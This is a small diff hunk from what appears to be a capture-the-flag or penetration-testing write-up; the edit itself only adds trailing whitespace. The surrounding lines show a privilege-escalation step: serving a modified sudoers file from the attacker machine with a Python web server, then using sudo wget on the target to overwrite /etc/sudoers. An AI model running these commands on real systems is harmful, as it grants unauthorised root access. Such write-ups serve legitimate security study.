@@ -147,7 +147,7 @@ After the file is edited, we can use **wget** on the target machine to retrieve 
 **python3** -m http.server
 
 [Target Machine]  
-**cd** /etc/
+**cd** /etc/  
 **sudo wget** attackerMachineIP:8000/sudoers --output-document=sudoers
 
 **sudo -l**
